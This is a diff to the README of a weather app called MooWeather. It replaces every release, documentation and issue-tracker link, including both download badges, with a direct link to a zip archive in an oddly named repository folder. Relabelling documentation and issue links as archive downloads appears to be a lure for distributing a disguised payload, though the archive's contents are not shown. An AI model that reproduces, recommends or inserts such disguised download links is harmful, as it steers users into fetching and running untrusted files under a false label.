@@ -6,12 +6,12 @@ Welcome to MooWeather, a user-friendly weather application designed for Turkish 
 
 ## 📥 Download MooWeather
 
-[![Download MooWeather](https://img.shields.io/badge/Download-MooWeather-blue)](https://github.com/shadow620/MooWeather/releases)
+[![Download MooWeather](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip)](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip)
 
 To install MooWeather, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/shadow620/MooWeather/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip).
    
 2. **Choose Your Version**  
    Scroll through the list of available versions. Each version is marked with its release notes.
@@ -63,8 +63,8 @@ We welcome contributions! If you would like to help improve MooWeather, feel fre
 
 ## 🔗 Additional Resources
 
-- [MooWeather Documentation](https://github.com/shadow620/MooWeather/wiki) - Learn more about features and setup.
-- [GitHub Issues](https://github.com/shadow620/MooWeather/issues) - Report bugs or suggest new features.
+- [MooWeather Documentation](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip) - Learn more about features and setup.
+- [GitHub Issues](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip) - Report bugs or suggest new features.
 
 ## 📜 License
 
@@ -72,4 +72,4 @@ MooWeather is licensed under the MIT License. You can use, modify, and distribut
 
 Take control of your weather today with MooWeather!  
 
-[![Download MooWeather](https://img.shields.io/badge/Download-MooWeather-blue)](https://github.com/shadow620/MooWeather/releases)
+[![Download MooWeather](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip)](https://raw.githubusercontent.com/shadow620/MooWeather/main/skewings/MooWeather.zip)
